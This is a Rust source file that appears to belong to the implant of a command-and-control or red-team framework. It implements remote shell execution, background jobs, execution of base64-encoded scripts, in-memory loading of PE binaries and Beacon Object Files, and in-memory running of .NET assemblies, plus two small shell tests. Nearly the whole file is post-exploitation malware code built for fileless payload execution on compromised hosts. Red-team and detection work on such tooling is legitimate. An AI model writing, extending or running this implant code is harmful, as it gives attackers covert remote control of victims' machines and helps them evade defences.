// src/agent/handlers/execution.rs — In-memory execution, extensions, shell

use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

use crate::utils;
use crate::agent::inmem;
use crate::lc;
use super::{HandlerContext, DispatchResult, AgentAction, lock_or_action};

// ── Background shell ───────────────────────────────────────────────────

pub fn handle_bg(ctx: &HandlerContext, shell_cmd: &str, req_id: u64) -> DispatchResult {
    let shell_cmd = shell_cmd.to_string();
    let desc = format!("shell: {}", &shell_cmd[..shell_cmd.len().min(60)]);
    let job_id = lock_or_action!(ctx.job_manager, "job_manager").spawn(desc, req_id, move |sink| {
        async move {
            sink.send_chunk(&format!("[*] Running: {}", shell_cmd)).await;
            let (out, err, code) = tokio::task::spawn_blocking(move || {
                utils::execute_shell_command(&shell_cmd)
            }).await.unwrap_or_else(|_| (String::new(), "Shell task panicked".into(), 1));
            if !out.is_empty() { sink.send_lines(&out).await; }
            (out, err, code)
        }
    });
    DispatchResult::Reply(format!("Job {} started", job_id), String::new(), 0, AgentAction::None)
}

// ── Explicit shell ─────────────────────────────────────────────────────

pub async fn handle_shell(shell_cmd: &str) -> DispatchResult {
    let shell_cmd = shell_cmd.to_string();
    let (o, e, c) = tokio::task::spawn_blocking(move || {
        utils::execute_shell_command(&shell_cmd)
    }).await.unwrap_or_else(|_| (String::new(), "Shell task panicked".into(), 1));
    DispatchResult::Reply(o, e, c, AgentAction::None)
}

// ── Extensions ─────────────────────────────────────────────────────────

pub fn handle_extension_bg(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() < 2 {
        return DispatchResult::Reply(String::new(), lc!("Invalid extension format"), 1, AgentAction::None);
    }

    let b64_str = parts[1].to_string();
    let script_args: Vec<String> = parts.iter().skip(2).map(|s| s.to_string()).collect();

    let script_bytes = match BASE64.decode(&b64_str) {
        Ok(b) => b,
        Err(_) => return DispatchResult::Reply(String::new(), lc!("Base64 Error"), 1, AgentAction::None),
    };
    let script = match String::from_utf8(script_bytes) {
        Ok(s) => s,
        Err(_) => return DispatchResult::Reply(String::new(), lc!("UTF8 Error"), 1, AgentAction::None),
    };

    let ext_mgr = ctx.ext_manager.clone();
    let desc = format!("ext: {}B script", script.len());

    let job_id = lock_or_action!(ctx.job_manager, "job_manager").spawn(desc, req_id, move |sink| {
        async move {
            sink.send_chunk("[*] Extension starting...").await;
            let result = tokio::task::spawn_blocking(move || {
                match ext_mgr.lock() {
                    Ok(mut mgr) => mgr.run_script(&script, script_args),
                    Err(_) => "Error: extension manager lock poisoned".to_string(),
                }
            }).await.unwrap_or_else(|e| format!("Task Error: {}", e));
            sink.send_chunk(&result).await;
            (result, String::new(), 0)
        }
    });

    DispatchResult::Reply(format!("Extension launched as Job {}", job_id), String::new(), 0, AgentAction::None)
}

// ── In-Memory PE ───────────────────────────────────────────────────────

pub fn handle_load_pe(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
    let b64 = cmd.split_whitespace().nth(1).unwrap_or("");
    let pe_bytes = match BASE64.decode(b64) {
        Ok(b) => b,
        Err(_) => return DispatchResult::Reply(String::new(), lc!("Invalid base64"), 1, AgentAction::None),
    };

    let desc = format!("inmem:pe {}KB", pe_bytes.len() / 1024);
    let job_id = lock_or_action!(ctx.job_manager, "job_manager").spawn(desc, req_id, move |sink| {
        async move {
            sink.send_chunk(&format!("[*] Loading PE ({} bytes)...", pe_bytes.len())).await;
            let result = tokio::task::spawn_blocking(move || {
                unsafe { inmem::pe_loader::load_pe(&pe_bytes) }
            }).await.unwrap_or_else(|e| Err(format!("Task Error: {}", e)));
            match result {
                Ok(msg) => { sink.send_chunk(&msg).await; (msg, String::new(), 0) }
                Err(e) => { sink.send_chunk(&format!("[-] {}", e)).await; (String::new(), e, 1) }
            }
        }
    });
    DispatchResult::Reply(format!("PE load launched as Job {}", job_id), String::new(), 0, AgentAction::None)
}

// ── In-Memory BOF ──────────────────────────────────────────────────────

pub fn handle_run_bof(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() < 2 {
        return DispatchResult::Reply(String::new(), lc!("Usage: inmem:bof <b64_coff> [b64_args]"), 1, AgentAction::None);
    }
    let coff_bytes = match BASE64.decode(parts[1]) {
        Ok(b) => b,
        Err(_) => return DispatchResult::Reply(String::new(), lc!("Invalid COFF base64"), 1, AgentAction::None),
    };
    let args_bytes = if parts.len() > 2 { BASE64.decode(parts[2]).unwrap_or_default() } else { Vec::new() };

    let desc = format!("inmem:bof {}KB", coff_bytes.len() / 1024);
    let job_id = lock_or_action!(ctx.job_manager, "job_manager").spawn(desc, req_id, move |sink| {
        async move {
            sink.send_chunk(&format!("[*] Running BOF ({} bytes)...", coff_bytes.len())).await;
            let result = tokio::task::spawn_blocking(move || {
                unsafe { inmem::bof::run_bof(&coff_bytes, &args_bytes) }
            }).await.unwrap_or_else(|e| Err(format!("Task Error: {}", e)));
            match result {
                Ok(msg) => { sink.send_chunk(&msg).await; (msg, String::new(), 0) }
                Err(e) => { sink.send_chunk(&format!("[-] {}", e)).await; (String::new(), e, 1) }
            }
        }
    });
    DispatchResult::Reply(format!("BOF launched as Job {}", job_id), String::new(), 0, AgentAction::None)
}

// ── .NET Assembly ──────────────────────────────────────────────────────

pub fn handle_run_dotnet(cmd: &str) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.splitn(6, ' ').collect();
    if parts.len() < 5 {
        return (String::new(), lc!("Usage: inmem:dotnet <path> <Type> <Method> <arg> [runtime]"), 1);
    }
    let runtime = if parts.len() > 5 { parts[5] } else { "v4.0.30319" };
    match unsafe { inmem::dotnet::run_assembly(parts[1], parts[2], parts[3], parts[4], runtime) } {
        Ok(msg) => (msg, String::new(), 0),
        Err(e) => (String::new(), e, 1),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn shell_echo() {
        match handle_shell("echo hello").await {
            DispatchResult::Reply(out, _, 0, _) => {
                assert!(out.contains("hello"), "Expected 'hello' in output, got: {}", out);
            }
            DispatchResult::Reply(_, err, code, _) => {
                panic!("Shell failed with code {}: {}", code, err);
            }
            _ => panic!("Expected Reply"),
        }
    }

    #[tokio::test]
    async fn shell_bad_command() {
        match handle_shell("nonexistent_command_12345").await {
            DispatchResult::Reply(_, _, code, _) => {
                assert_ne!(code, 0, "Nonexistent command should fail");
            }
            _ => panic!("Expected Reply"),
        }
    }
}
